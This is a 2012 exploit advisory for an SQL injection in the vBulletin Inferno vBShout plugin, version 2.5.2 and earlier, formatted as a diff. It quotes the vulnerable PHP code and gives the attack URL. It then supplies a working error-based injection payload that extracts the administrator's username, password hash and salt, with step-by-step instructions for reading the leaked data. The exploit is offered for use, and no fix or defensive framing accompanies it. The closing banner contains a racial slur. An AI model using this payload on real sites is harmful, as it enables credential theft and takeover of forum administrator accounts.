@@ -1,0 +1,62 @@
+====================================================================
+#               Inferno vBShout SQLI 0day <= 2.5.2                 #
+====================================================================
+   ______     _ ______           
+  / ____/____(_) __/ /____  _____
+ / / __/ ___/ / /_/ __/ _ \/ ___/
+/ /_/ / /  / / __/ /_/  __/ /    
+\____/_/  /_/_/  \__/\___/_/     
+                                 
+====================================================================
+#               Inferno vBShout SQLI 0day <= 2.5.2                 #
+====================================================================
+# Found by: Luit
+# Site: http://grifter.org
+# E-Mail: luit@usa.com
+# Date: 14/08/2012
+
+====================================================================
+#    Vulnerable Code - infernoshout.php & inferno_settings.php     #
+====================================================================
+$commands = unserialize($this->settings['s_commands']);
+
+if ($this->vbulletin->db->affected_rows() < 1 && !$this->vbulletin->db->query_first("select * from " . TABLE_PREFIX . "infernoshoutusers where s_user='{$this->vbulletin->userinfo['userid']}'"))
+		{
+			$this->vbulletin->db->query("
+				insert into " . TABLE_PREFIX . "infernoshoutusers
+				(s_user, s_commands)
+				values
+				({$this->vbulletin->userinfo['userid']}, '" . serialize($commands) . "')
+			");
+		}
+		
+====================================================================
+#                           Exploit Location                       #
+====================================================================
+# Location: http://site.com/infernoshout.php?do=options&area=commands
+
+====================================================================
+#                           SQL Injection                          #
+====================================================================
+' and (select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x3a,password,0x3a,salt) as char),0x7e)) from user where userid=1 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND ''='#
+
+====================================================================
+#                           How to use                             #
+====================================================================
+
+Insert SQL injection into the first "Command Input" box and enter anything into the first "Command Output" box, hit save settings, you will be treated with a database error, view the page source and scroll to the bottom of the page, you will see some quoted text containing the data you want.
+====================================================================
+#                           Video Tutorial                         #
+====================================================================
+http://www.youtube.com/watch?v=g70_JaKnBbw
+
+====================================================================
+#                          Peace out nigga                         #
+====================================================================
+# Found by: Luit
+# Site: http://grifter.org
+# E-Mail: luit@usa.com
+====================================================================
+#                          Peace out nigga                         #
+====================================================================
+
